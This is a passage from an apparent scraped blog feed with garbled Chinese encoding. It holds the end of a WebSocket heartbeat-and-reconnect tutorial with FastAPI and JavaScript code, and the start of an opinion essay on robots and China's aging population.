True:\n            await asyncio.sleep(self._heartbeat_check_interval)\n            now = datetime.utcnow()\n            timeout = timedelta(seconds=70)  # è¶…è¿‡70ç§’æ²¡å¿ƒè·³å°±æ–­å¼€\n            dead_conns = []\n            for ws, last_ping in self.active_connections.items():\n                if now - last_ping &gt; timeout:\n                    dead_conns.append(ws)\n            for ws in dead_conns:\n                try:\n                    await ws.close(code=1000, reason=\"heartbeat timeout\")\n                except:\n                    pass\n                self.disconnect(ws)\n\nmanager = ConnectionManager()\n\n@app.websocket(\"/ws\")\nasync def websocket_endpoint(websocket: WebSocket):\n    await manager.connect(websocket)\n    await manager.handle_messages(websocket)</code></pre>\n<p style=\"font-size: 16px; margin: 20px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">ğŸ”” é‡ç‚¹è¯´æ˜ï¼š</strong> <span style=\"display: block; margin-left: 16px; margin-top: 6px;\">- <code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">handle_messages</code>é‡Œåªå¤„ç†å¿ƒè·³ï¼Œå…¶ä»–ä¸šåŠ¡æ¶ˆæ¯å¯ä»¥è‡ªå®šä¹‰ã€‚</span> <span style=\"display: block; margin-left: 16px;\">- åå°å¿ƒè·³æ£€æŸ¥çº¿ç¨‹æ¯30ç§’è·‘ä¸€æ¬¡ï¼Œå¦‚æœæŸè¿æ¥è¶…è¿‡70ç§’æ²¡æ”¶åˆ°å¿ƒè·³ï¼Œå°±ä¸»åŠ¨å…³é—­ã€‚è¿™ä¸ª70ç§’ä¸€å®šè¦å¤§äºå®¢æˆ·ç«¯çš„å¿ƒè·³é—´éš”ï¼ˆæ¯”å¦‚å®¢æˆ·ç«¯30ç§’å‘ä¸€æ¬¡ï¼Œé‚£70ç§’å¤§æ¦‚æ¼æ‰2æ¬¡éƒ½æ²¡å›å¤æ‰æ–­ï¼Œé˜²æ­¢ç½‘ç»œæŠ–åŠ¨è¯¯æ€ï¼‰ã€‚</span> <span style=\"display: block; margin-left: 16px;\">- æ³¨æ„<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">WebSocketDisconnect</code>çš„æ•è·ï¼ŒåŠæ—¶æ¸…ç†å­—å…¸ï¼Œé¿å…å†…å­˜æ³„æ¼ã€‚</span></p>\n<h2 style=\"font-size: 22px; font-weight: 600; margin: 30px 0 15px; padding-bottom: 6px;\">ğŸ’» ç¬¬å››éƒ¨åˆ†ï¼šJavaScriptå‰ç«¯å®ç°</h2>\n<p style=\"font-size: 16px; margin: 20px 0;\">å‰ç«¯ä¸»è¦åšä¸‰ä»¶äº‹ï¼šå»ºç«‹è¿æ¥ã€å®šæ—¶å‘å¿ƒè·³ã€ç›‘å¬æ–­å¼€è‡ªåŠ¨é‡è¿ã€‚æˆ‘ä¹ æƒ¯æŠŠWebSocketå°è£…æˆä¸€ä¸ªç±»ï¼Œæ–¹ä¾¿å¤ç”¨ã€‚ç›´æ¥ä¸Šä»£ç ï¼š</p>\n<pre class=\"language-javascript highlighter-hljs\"><code>class WebSocketClient {\n    constructor(url) {\n        this.url = url;\n        this.ws = null;\n        this.heartbeatInterval = 30000; // 30ç§’ä¸€æ¬¡å¿ƒè·³\n        this.reconnectInterval = 3000;   // æ–­çº¿å3ç§’é‡è¿\n        this.heartbeatTimer = null;\n        this.reconnectTimer = null;\n        this.connect();\n    }\n\n    connect() {\n        this.ws = new WebSocket(this.url);\n        this.ws.onopen = () =&gt; {\n            console.log('WebSocket å·²è¿æ¥');\n            // è¿æ¥æˆåŠŸåï¼Œå¯åŠ¨å¿ƒè·³\n            this.startHeartbeat();\n            // å¦‚æœä¹‹å‰æœ‰é‡è¿å®šæ—¶å™¨ï¼Œæ¸…æ‰\n            if (this.reconnectTimer) {\n                clearTimeout(this.reconnectTimer);\n                this.reconnectTimer = null;\n            }\n        };\n\n        this.ws.onmessage = (event) =&gt; {\n            const data = JSON.parse(event.data);\n            if (data.type === 'pong') {\n                console.log('æ”¶åˆ°å¿ƒè·³pongï¼Œè¿æ¥æ­£å¸¸');\n                // å¯ä»¥åœ¨è¿™é‡Œæ›´æ–°UIæ˜¾ç¤ºæœ€åå¿ƒè·³æ—¶é—´ï¼Œä½†ä¸å¿…é¡»\n            } else {\n                // å¤„ç†å…¶ä»–ä¸šåŠ¡æ¶ˆæ¯\n                console.log('ä¸šåŠ¡æ¶ˆæ¯', data);\n            }\n        };\n\n        this.ws.onclose = (e) =&gt; {\n            console.log('WebSocket å…³é—­', e.reason);\n            // åœæ­¢å¿ƒè·³\n            this.stopHeartbeat();\n            // å°è¯•é‡è¿\n            this.reconnect();\n        };\n\n        this.ws.onerror = (err) =&gt; {\n            console.error('WebSocket é”™è¯¯', err);\n            this.ws.close();\n        };\n    }\n\n    startHeartbeat() {\n        this.heartbeatTimer = setInterval(() =&gt; {\n            if (this.ws &amp;&amp; this.ws.readyState === WebSocket.OPEN) {\n                this.ws.send(JSON.stringify({ type: 'ping' }));\n                console.log('å‘é€å¿ƒè·³ping');\n            } else {\n                console.warn('è¿æ¥æœªå¼€å¯ï¼Œåœæ­¢å‘é€å¿ƒè·³');\n                this.stopHeartbeat();\n            }\n        }, this.heartbeatInterval);\n    }\n\n    stopHeartbeat() {\n        if (this.heartbeatTimer) {\n            clearInterval(this.heartbeatTimer);\n            this.heartbeatTimer = null;\n        }\n    }\n\n    reconnect() {\n        this.stopHeartbeat();\n        if (!this.reconnectTimer) {\n            this.reconnectTimer = setTimeout(() =&gt; {\n                console.log('å°è¯•é‡è¿...');\n                this.connect();\n            }, this.reconnectInterval);\n        }\n    }\n\n    // ä¸»åŠ¨å…³é—­è¿æ¥ï¼ˆæ¯”å¦‚é¡µé¢å¸è½½æ—¶ï¼‰\n    close() {\n        this.stopHeartbeat();\n        if (this.ws) {\n            this.ws.close();\n        }\n    }\n}\n\n// ä½¿ç”¨ç¤ºä¾‹\nconst client = new WebSocketClient('ws://ä½ çš„åŸŸå/ws');\n// é¡µé¢å…³é—­å‰ä¸»åŠ¨æ¸…ç†\nwindow.addEventListener('beforeunload', () =&gt; client.close());</code></pre>\n<p style=\"font-size: 16px; margin: 20px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">âš ï¸ å…³é”®ç»†èŠ‚ï¼š</strong> <span style=\"display: block; margin-left: 16px; margin-top: 6px;\">- å¿ƒè·³é—´éš”ä¸è¦è¶…è¿‡Nginxçš„<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">proxy_read_timeout</code>ï¼Œä¸€èˆ¬è®¾30ç§’æ¯”è¾ƒå®‰å…¨ã€‚</span> <span style=\"display: block; margin-left: 16px;\">- æ–­çº¿é‡è¿è¦é˜²æŠ–ï¼šé€šè¿‡<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">reconnectTimer</code>é¿å…é‡å¤é‡è¿ã€‚</span> <span style=\"display: block; margin-left: 16px;\">- é¡µé¢å…³é—­æ—¶ä¸€å®šè¦<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">close</code>è¿æ¥ï¼Œå¦åˆ™æœåŠ¡ç«¯å¯èƒ½ä¿ç•™å­¤å„¿è¿æ¥ç›´åˆ°è¶…æ—¶ã€‚</span></p>\n<h2 style=\"font-size: 22px; font-weight: 600; margin: 30px 0 15px; padding-bottom: 6px;\">ğŸ§ª ç¬¬äº”éƒ¨åˆ†ï¼šè·‘èµ·æ¥çœ‹çœ‹æ•ˆæœ</h2>\n<p style=\"font-size: 16px; margin: 20px 0;\">å¯åŠ¨FastAPIï¼ˆ<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">uvicorn main:app --reload</code>ï¼‰ï¼Œæ‰“å¼€æµè§ˆå™¨æ§åˆ¶å°ï¼Œä½ ä¼šçœ‹åˆ°æ¯éš”30ç§’å‘é€ä¸€æ¬¡pingï¼ŒæœåŠ¡å™¨ç«‹å³å›å¤pongã€‚å³ä½¿ä½ æ–­å¼€Wi-Fiå†æ‰“å¼€ï¼Œå®¢æˆ·ç«¯ä¹Ÿä¼šè‡ªåŠ¨é‡è¿ï¼Œå¹¶ä¸”é‡è¿åå¿ƒè·³ç»§ç»­ã€‚ğŸ¯</p>\n<h2 style=\"font-size: 22px; font-weight: 600; margin: 30px 0 15px; padding-bottom: 6px;\">ğŸ’£ ç¬¬å…­éƒ¨åˆ†ï¼šé‚£äº›å¹´æˆ‘è¸©è¿‡çš„å‘ï¼ˆå¿…çœ‹ï¼‰</h2>\n<div style=\"margin-left: 8px;\">\n<p style=\"margin: 6px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">å‘1ï¼šå¿ƒè·³é—´éš”å¤ªçŸ­ï¼ŒæœåŠ¡å™¨å‹åŠ›å¤§</strong> â€”â€” 1ç§’ä¸€æ¬¡çº¯å±è‡ªæ®‹ï¼Œ30ç§’ä¸€æ¬¡è¶³å¤Ÿï¼Œæ—¢ä¿æ´»åˆçœèµ„æºã€‚</p>\n<p style=\"margin: 6px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">å‘2ï¼šæœåŠ¡ç«¯æ²¡åšè¶…æ—¶ä¸»åŠ¨æ–­å¼€</strong> â€”â€” å®¢æˆ·ç«¯çªç„¶æ‰çº¿ï¼ˆæ¯”å¦‚ç”¨æˆ·å¼ºåˆ¶æ€è¿›ç¨‹ï¼‰ï¼ŒæœåŠ¡ç«¯ä¸çŸ¥é“ï¼Œè¿æ¥ä¸€ç›´å ç€å†…å­˜ã€‚æ‰€ä»¥åå°å¿ƒè·³æ£€æŸ¥ä¸€å®šè¦æœ‰ï¼Œè¶…æ—¶å°±closeã€‚</p>\n<p style=\"margin: 6px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">å‘3ï¼šé‡è¿æ—¶å¿˜è®°æ¸…ç†æ—§å®šæ—¶å™¨</strong> â€”â€” æ¯æ¬¡é‡è¿éƒ½æ–°å»ºä¸€ä¸ª<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">setInterval</code>ï¼Œå¯¼è‡´å¤šä¸ªå¿ƒè·³çº¿ç¨‹å¹¶å‘ï¼Œæ¶ˆæ¯çˆ†ç‚¸ã€‚è§£å†³æ–¹æ¡ˆï¼šé‡è¿å‰å…ˆ<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">stopHeartbeat()</code>ã€‚</p>\n<p style=\"margin: 6px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">å‘4ï¼šå‰åç«¯å¿ƒè·³æ ¼å¼çº¦å®šä¸ä¸€è‡´</strong> â€”â€” æˆ‘ç”¨çš„æ˜¯<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">{\"type\":\"ping\"}</code>ï¼Œå¦‚æœä½ åç«¯ç”¨å­—æ®µ<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">heartbeat</code>ï¼Œä¸€å®šè®°å¾—å¯¹é½ï¼Œå¦åˆ™æœåŠ¡å™¨ä¸è®¤ï¼Œç›¸å½“äºæ²¡å¿ƒè·³ã€‚</p>\n<p style=\"margin: 6px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">å‘5ï¼šæ²¡è€ƒè™‘SSL/åŠ å¯†è¿æ¥</strong> â€”â€” ç”Ÿäº§ç¯å¢ƒç”¨<span style=\"color: rgba(186, 55, 42, 1);\"><code>wss://</code></span>ï¼Œè¯ä¹¦é…ç½®è¦æ­£ç¡®ï¼Œå¦åˆ™è¿æ¥ç›´æ¥è¢«æ‹’ç»ã€‚</p>\n</div>\n<p style=\"font-size: 16px; margin: 20px 0;\">å¦å¤–ï¼Œå¦‚æœä½ æƒ³æ›´ä¼˜é›…ä¸€ç‚¹ï¼Œå¯ä»¥ç»“åˆ<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">asyncio.timeout</code>æˆ–è€…<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">websocket.receive()</code>çš„è¶…æ—¶å‚æ•°ï¼Œä¸è¿‡æˆ‘è§‰å¾—ä¸Šé¢è¿™ç§â€œè®°å½•æœ€åå¿ƒè·³+åå°æ£€æŸ¥â€çš„æ¨¡å¼æœ€æ¸…æ™°ã€‚</p>\n<h2 style=\"font-size: 22px; font-weight: 600; margin: 30px 0 15px; padding-bottom: 6px;\">ğŸ“Œ æœ€åå•°å—¦ä¸€å¥</h2>\n<p style=\"font-size: 16px; margin: 20px 0;\">å¿ƒè·³æœºåˆ¶ä¸æ˜¯é“¶å¼¹ï¼Œä½†å®ƒç¡®å®æ˜¯WebSocketé•¿è¿æ¥ä¿æŒæœ€ç®€å•æœ‰æ•ˆçš„åŠæ³•ã€‚ç»“åˆæ–­çº¿é‡è¿ï¼Œèƒ½è®©ä½ çš„å®æ—¶åº”ç”¨åœ¨æ¶åŠ£ç½‘ç»œç¯å¢ƒä¸‹ä¾ç„¶åšæŒºã€‚å¦‚æœä½ åœ¨ç”Ÿäº§ç¯å¢ƒè¿˜æœ‰æ›´é«˜è¦æ±‚ï¼Œæ¯”å¦‚é›†ç¾¤ä¸‹çš„è¿æ¥çŠ¶æ€åŒæ­¥ã€å¿ƒè·³ä¸ä¸šåŠ¡æ¶ˆæ¯ä¼˜å…ˆçº§ï¼Œæ¬¢è¿ç•™è¨€äº¤æµã€‚</p>\n<hr />\n<p style=\"font-size: 18px; font-weight: 500; color: rgba(44, 62, 80, 1); margin-bottom: 10px;\">è€æœ‹å‹æé†’ ğŸ‘‹</p>\n<p style=\"font-size: 16px; margin: 10px 0;\">è¿™ç¯‡æ–‡ç« é‡Œçš„ä»£ç æˆ‘éƒ½æ˜¯ç”¨è¡€æ³ªæ•™è®­æ¢æ¥çš„ï¼Œç°åœ¨ç›´æ¥æŠ„å°±èƒ½è·‘ã€‚ä½†ä½ çš„ä¸šåŠ¡åœºæ™¯å¯èƒ½ä¸ä¸€æ ·ï¼Œæ¯”å¦‚å¿ƒè·³é—´éš”æ˜¯å¦éœ€è¦åŠ¨æ€è°ƒæ•´ï¼ŸæœåŠ¡ç«¯è¦ä¸è¦ä¸»åŠ¨pingï¼Ÿæ¬¢è¿åœ¨è¯„è®ºåŒºåˆ†äº«ä½ çš„â€œå¥‡è‘©â€è¸©å‘ç»å†ï¼Œæˆ–è€…æ”¶è—èµ·æ¥ï¼Œä¸‹æ¬¡ä¸Šçº¿å‰ç¿»å‡ºæ¥çœ‹ä¸€çœ¼ï¼Œä¹Ÿè®¸èƒ½å¸®ä½ çœä¸‹ä¸€ä¸ªé€šå®µã€‚</p>\n<p style=\"font-size: 16px; margin: 30px 0 10px;\"><strong style=\"color: rgba(186, 55, 42, 1);\">å¦‚æœä½ è§‰å¾—æœ‰ç”¨ï¼Œç‚¹èµæˆ–åˆ†äº«ç»™å›¢é˜Ÿï¼Œä¸‹æ¬¡é‡åˆ°WebSocketæ–­è¿é—®é¢˜ï¼Œå’±ä»¬å°±ä¸å†æ…Œäº†ã€‚ğŸ˜</strong></p>\n</div>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 17:05</span>&nbsp;\n<a href=\"https://www.cnblogs.com/ymtianyu\">ä¸€åç¨‹åºåª›å‘€</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">60</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "ä»æ˜¥æ™šæœºå™¨äººï¼Œçœ‹ä¸­å›½æœªæ¥ç™¾å¹´çš„å…»è€ä¹‹è·¯",
      "link": "https://www.cnblogs.com/xdesigner/p/19621864",
      "published": "",
      "description": "<h2>\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xdesigner/p/19621864\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-02-17 19:03\">\n    <span>ä»æ˜¥æ™šæœºå™¨äººï¼Œçœ‹ä¸­å›½æœªæ¥ç™¾å¹´çš„å…»è€ä¹‹è·¯</span>\n    \n\n</a>\n\n\t\t</h2>\n\t\t<div class=\"postText\">    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        æœªæ¥ä¸€ç™¾å¹´ï¼Œä¸­å›½ä¼šèµ°ä¸€æ¡ï¼šäººå£é€‚åº¦ã€ç§‘æŠ€å¼ºå¤§ã€äº§ä¸šé«˜æ•ˆã€å…»è€æ™®æƒ çš„é“è·¯ã€‚ç§‘æŠ€è®©ç”Ÿæ´»æ›´å®‰ç¨³ï¼Œè®©å…»è€æ›´æœ‰å°Šä¸¥ï¼Œè®©å›½å®¶å‘å±•æ›´å¯æŒç»­ã€‚\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"ä»æ˜¥æ™šæœºå™¨äººçœ‹ä¸­å›½æœªæ¥ç™¾å¹´çš„å…»è€ä¹‹è·¯\">ä»æ˜¥æ™šæœºå™¨äººï¼Œçœ‹ä¸­å›½æœªæ¥ç™¾å¹´çš„å…»è€ä¹‹è·¯</h1>\n<p>2026å¹´æ˜¥æ™šçš„æ­¦æœ¯æœºå™¨äººèŠ‚ç›®ï¼Œæ•´é½åˆ’ä¸€çš„åŠ¨ä½œã€ç¨³å®šçš„å¹³è¡¡èƒ½åŠ›ï¼Œè®©äººå°è±¡æ·±åˆ»ã€‚èŠ‚ç›®æ’­å‡ºåï¼Œç¤¾äº¤åª’ä½“ä¸Šå‡ºç°å¤§é‡çƒ­è®®ã€‚ä¸€ä¸ªçªå‡ºçš„å£°éŸ³æ˜¯ï¼Œä¸å°‘å¹´è½»äººç•™è¨€å¹¶ç›¸äº’å›å¤è®¨è®ºï¼šâ€œä»¥åä¸ç”Ÿå°å­©äº†ï¼ŒæŠŠé’±å­˜èµ·æ¥ï¼Œç­‰è€äº†ç›´æ¥ä¹°æœºå™¨äººå…»è€ã€‚â€</p>\n<p>è¿™è¯ä¹å¬åƒç©ç¬‘ï¼Œç»†æƒ³å´å¾ˆæœ‰æ·±æ„ã€‚å®ƒè§¦åŠäº†ä¸€ä¸ªæ­£åœ¨å‘ç”Ÿçš„æ ¹æœ¬å˜åŒ–ï¼šå½“ç§‘æŠ€è¶³å¤Ÿå…ˆè¿›ï¼Œä¼ ç»Ÿçš„â€œå…»å„¿é˜²è€â€æ¨¡å¼ï¼Œæ­£åœ¨è¢«ä¸€ç§æ–°çš„å¯èƒ½æ‰€æ›¿ä»£ã€‚ä½†è¿™ç§æ›¿ä»£ä¸ä¼šä¸€è¹´è€Œå°±â€”â€”åœ¨æœºå™¨äººçœŸæ­£æ™®åŠä¹‹å‰ï¼Œä¸­å›½å°†é¢ä¸´ä¸€ä¸ª10åˆ°20å¹´çš„â€œå±é™©å¹³è¡¡æœŸâ€ã€‚</p>\n<h2 id=\"ä¸€æœªå¯Œå…ˆè€æˆ‘ä»¬é¢ä¸´çš„ç°å®å‹åŠ›\">ä¸€ã€æœªå¯Œå…ˆè€ï¼šæˆ‘ä»¬é¢ä¸´çš„ç°å®å‹åŠ›</h2>\n<p>æ˜¥æ™šæœºå™¨äººå±•ç¤ºçš„è¿åŠ¨æ§åˆ¶å’Œç²¾å‡†æ“ä½œèƒ½åŠ›ï¼Œæ°æ°æ˜¯å…»è€åœºæ™¯ä¸­æœ€éœ€è¦çš„æŠ€æœ¯ã€‚ä½†é—®é¢˜çš„ç´§è¿«æ€§åœ¨äºï¼Œè€é¾„åŒ–æ­£åœ¨åŠ é€Ÿï¼Œè€Œæœºå™¨äººæŠ€æœ¯å°šæœªå®Œå…¨æˆç†Ÿã€‚</p>\n<p>ä¸€ç»„æ•°æ®å¯ä»¥è¯´æ˜ç°çŠ¶ï¼šç›®å‰æˆ‘å›½60å²åŠä»¥ä¸Šäººå£å·²è¾¾3.1äº¿ï¼Œå æ€»äººå£çš„22%ã€‚å…¶ä¸­å¤±èƒ½è€äººçº¦3500ä¸‡ï¼Œè€Œä¸“ä¸šæŠ¤ç†å‘˜çš„ç¼ºå£è¶…è¿‡500ä¸‡äººã€‚é¢„è®¡åˆ°2030å¹´ï¼Œ60å²ä»¥ä¸Šäººå£å°†å¢è‡³3.9äº¿ï¼Œè€é¾„åŒ–æ°´å¹³æ¥è¿‘28%ã€‚</p>\n<p>ä¸å‘è¾¾å›½å®¶â€œå…ˆå¯Œåè€â€ä¸åŒï¼Œä¸­å›½æ˜¯â€œæœªå¯Œå…ˆè€â€â€”â€”äººå‡GDPåˆšçªç ´1.2ä¸‡ç¾å…ƒï¼Œå°±è¿æ¥äº†æ·±åº¦è€é¾„åŒ–ã€‚è¿™æ„å‘³ç€ï¼Œç¤¾ä¼šè´¢å¯Œç§¯ç´¯ä¸è¶³ï¼Œå…»è€é‡‘ä½“ç³»å‹åŠ›å·¨å¤§ï¼Œè€Œå¯ç”¨çš„å¹´è½»åŠ³åŠ¨åŠ›æ­£åœ¨å‡å°‘ã€‚</p>\n<h2 id=\"äºŒæœ€å±é™©çš„åå¹´2026-2035å¹´çš„åŠ¨æ€å¹³è¡¡\">äºŒã€æœ€å±é™©çš„åå¹´ï¼š2026-2035å¹´çš„åŠ¨æ€å¹³è¡¡</h2>\n<p>è¿™æ˜¯æ•´ä¸ªç™¾å¹´è¿›ç¨‹ä¸­æœ€å…³é”®çš„é˜¶æ®µï¼Œä¹Ÿæ˜¯ä¸€ä¸ªè„†å¼±çš„å¹³è¡¡æœŸã€‚</p>\n<p><strong>å‹åŠ›æ¥è‡ªä¸‰ä¸ªæ–¹é¢ï¼š</strong><br />\nç¬¬ä¸€ï¼Œ1960-1975å¹´å‡ºç”Ÿçš„äººå£é«˜å³°æ­£åœ¨é›†ä¸­è¿›å…¥é€€ä¼‘å’Œéœ€è¦ç…§æŠ¤çš„é˜¶æ®µï¼Œå…»è€æœåŠ¡éœ€æ±‚çˆ†å‘å¼å¢é•¿ã€‚<br />\nç¬¬äºŒï¼Œæœºå™¨äººæŠ€æœ¯å°šæœªæˆç†Ÿã€‚ç›®å‰çš„äººå½¢æœºå™¨äººæˆæœ¬åœ¨10ä¸‡-20ä¸‡å…ƒä¸€å°ï¼Œä¸”åªèƒ½å®Œæˆè¾…åŠ©æ€§å·¥ä½œï¼Œæ— æ³•æ›¿ä»£å¤æ‚æŠ¤ç†ã€‚å¤§è§„æ¨¡æ™®åŠè‡³å°‘è¦ç­‰åˆ°2030å¹´ä»¥åã€‚<br />\nç¬¬ä¸‰ï¼Œç”Ÿè‚²ç‡å·²ç»è·Œç ´1.1ï¼Œè¿›å…¥å…¨çƒæœ€ä½è¡Œåˆ—ã€‚è¿™æ„å‘³ç€åç»­åŠ³åŠ¨äººå£è¡¥ç»™ä¸¥é‡ä¸è¶³ã€‚</p>\n<p><strong>è¿™ä¸ªé˜¶æ®µçš„é£é™©åœ¨äºï¼š</strong></p>\n<ul>\n<li>å…»è€é‡‘æ”¶æ”¯ç¼ºå£æ‰©å¤§ï¼Œéƒ¨åˆ†åœ°åŒºå¯èƒ½é¢ä¸´æ”¯ä»˜å‹åŠ›</li>\n<li>æŠ¤ç†äººåŠ›çŸ­ç¼ºå¯¼è‡´æœåŠ¡è´¨é‡ä¸‹é™ï¼Œå¤±èƒ½è€äººç…§æŠ¤å‡ºç°çœŸç©º</li>\n<li>å¹´è½»äººæ—¢è¦èµ¡å…»è€äººï¼Œåˆé¢ä¸´å°±ä¸šå‹åŠ›ï¼Œç”Ÿè‚²æ„æ„¿è¿›ä¸€æ­¥èµ°ä½</li>\n<li>æœºå™¨äººæœåŠ¡æˆæœ¬ä»ç„¶åé«˜ï¼Œæ™®é€šå®¶åº­éš¾ä»¥è´Ÿæ‹…</li>\n</ul>\n<p>è¿™æ˜¯ä¸€ä¸ªåŠ¨æ€å¹³è¡¡ï¼šæœºå™¨äººå¼€å§‹è¿›å…¥å…»è€åœºæ™¯ï¼Œä½†æ›¿ä»£ç‡ä¸è¶³ï¼›äººå£è€é¾„åŒ–åŠ é€Ÿï¼Œä½†ç¤¾ä¼šè½¬å‹å°šæœªå®Œæˆã€‚ç¨æœ‰åº”å¯¹å¤±å½“ï¼Œå°±å¯èƒ½å‡ºç°ç³»ç»Ÿæ€§å‹åŠ›ã€‚</p>\n<h2 id=\"ä¸‰åº¦è¿‡å±é™©æœŸæœªæ¥ç™¾å¹´çš„ä¸‰é˜¶æ®µæ¼”è¿›\">ä¸‰ã€åº¦è¿‡å±é™©æœŸï¼šæœªæ¥ç™¾å¹´çš„ä¸‰é˜¶æ®µæ¼”è¿›</h2>\n<h3 id=\"2035-2050æœºå™¨äººæ™®åŠæœŸ\">2035-2050ï¼šæœºå™¨äººæ™®åŠæœŸ</h3>\n<p>ç”Ÿè‚²ç‡é¢„è®¡åœ¨1.1-1.2ä¹‹é—´ï¼Œæ€»äººå£ä»14äº¿é€æ­¥å›è½è‡³12äº¿å·¦å³ã€‚å…»è€æœºå™¨äººå¸‚åœºå·²è¿›å…¥å¿«é€Ÿå¢é•¿é€šé“ï¼šä»2023å¹´çš„66äº¿å…ƒï¼Œé¢„è®¡åˆ°2029å¹´å¢è‡³159äº¿å…ƒï¼Œ2030å¹´åå¢é€Ÿè¿›ä¸€æ­¥åŠ å¿«ã€‚è¿™ä¸€é˜¶æ®µçš„æœºå™¨äººä»è¾…åŠ©èµ°å‘ä¸»åŠ›â€”â€”2035å¹´å‰åï¼Œæˆæœ¬æœ‰æœ›é™è‡³5ä¸‡å…ƒä»¥å†…ï¼Œæœˆç§Ÿæ¨¡å¼å¼€å§‹æ™®åŠã€‚æœºå™¨äººæœåŠ¡å¼€å§‹å®è´¨æ€§åˆ†æ‹…å…»è€å‹åŠ›ã€‚</p>\n<h3 id=\"2050-2080æœºå™¨äººæˆç†ŸæœŸ\">2050-2080ï¼šæœºå™¨äººæˆç†ŸæœŸ</h3>\n<p>ç”Ÿè‚²ç‡å›å‡è‡³1.2-1.3çš„å®‰å…¨åŒºé—´ï¼Œäººå£ç¨³å®šåœ¨9äº¿-10äº¿ã€‚æœºå™¨äººæ›¿ä»£70%-80%çš„åŸºç¡€åŠ³åŠ¨ï¼Œäººå½¢æœºå™¨äººå¯ä»¥å®Œæˆå…¨æµç¨‹ç…§æŠ¤ã€‚å¸‚åœºè§„æ¨¡è¿›å…¥ä¸‡äº¿çº§åˆ«ï¼Œå•å°æœºå™¨äººæˆæœ¬é™è‡³1ä¸‡-3ä¸‡å…ƒï¼Œæˆ–è€…æœˆç§Ÿä¸¤ä¸‰åƒå…ƒã€‚é•¿æœŸæŠ¤ç†ä¿é™©å…¨é¢è¦†ç›–ï¼Œå…»è€æœåŠ¡å®ç°æ ‡å‡†åŒ–ã€æ™®æƒ åŒ–ã€‚</p>\n<h3 id=\"2080-2126æ™ºèƒ½æ–‡æ˜æœŸ\">2080-2126ï¼šæ™ºèƒ½æ–‡æ˜æœŸ</h3>\n<p>ç”Ÿè‚²ç‡ä¿æŒåœ¨1.0-1.2ï¼Œäººå£ç¨³å®šåœ¨6äº¿-8äº¿ã€‚æœºå™¨äººæ›¿ä»£90%ä»¥ä¸Šçš„é‡å¤æ€§åŠ³åŠ¨ï¼Œä¸é€šç”¨AIæ·±åº¦èåˆï¼Œä¸ä»…èƒ½ç…§é¡¾èº«ä½“ï¼Œè¿˜èƒ½ç²¾ç¥é™ªä¼´ã€é¢„åˆ¤å¥åº·é—®é¢˜ã€‚æœºå™¨äººå³æœåŠ¡ï¼ˆRaaSï¼‰æ¨¡å¼æ™®åŠï¼Œä¸ªäººå­˜æ¬¾ã€å…»è€é‡‘ã€å•†ä¸šä¿é™©å…±åŒæ”¯ä»˜æœºå™¨äººæœåŠ¡ï¼Œå…»è€æˆæœ¬è¿›ä¸€æ­¥é™ä½ã€‚</p>\n<h2 id=\"å››åä¸‡äº¿çº§äº§ä¸šæ”¯æ’‘å…»è€é—­ç¯\">å››ã€åä¸‡äº¿çº§äº§ä¸šï¼Œæ”¯æ’‘å…»è€é—­ç¯</h2>\n<p>è¿™ä¸€åˆ‡çš„æ ¹åŸºæ˜¯æœºå™¨äººäº§ä¸šã€‚ç›®å‰æ™ºèƒ½å·¡æ£€æœºå™¨äººå¸‚åœºè§„æ¨¡å·²è¶…230äº¿å…ƒï¼Œæ 